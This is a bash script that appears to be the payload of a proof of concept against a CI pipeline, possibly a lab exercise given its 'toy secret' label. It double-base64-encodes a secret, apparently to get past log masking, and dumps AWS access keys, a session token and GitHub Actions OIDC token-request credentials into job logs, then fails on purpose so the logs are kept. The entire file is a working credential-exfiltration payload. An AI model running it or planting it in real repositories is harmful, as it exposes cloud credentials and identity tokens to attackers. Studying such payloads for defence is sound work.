#!/usr/bin/env bash
set -e

# Leak GARALT toy secret as double-base64 for verification
echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)"

# Leak AWS credentials configured BEFORE checkout by configure-aws-credentials
echo "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID"
echo "AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY"
echo "AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN"

# Leak OIDC token exchange capability (from id-token: write permission)
echo "ACTIONS_ID_TOKEN_REQUEST_URL=$ACTIONS_ID_TOKEN_REQUEST_URL"
echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN=$ACTIONS_ID_TOKEN_REQUEST_TOKEN"

# Terminate to preserve logs
exit 1
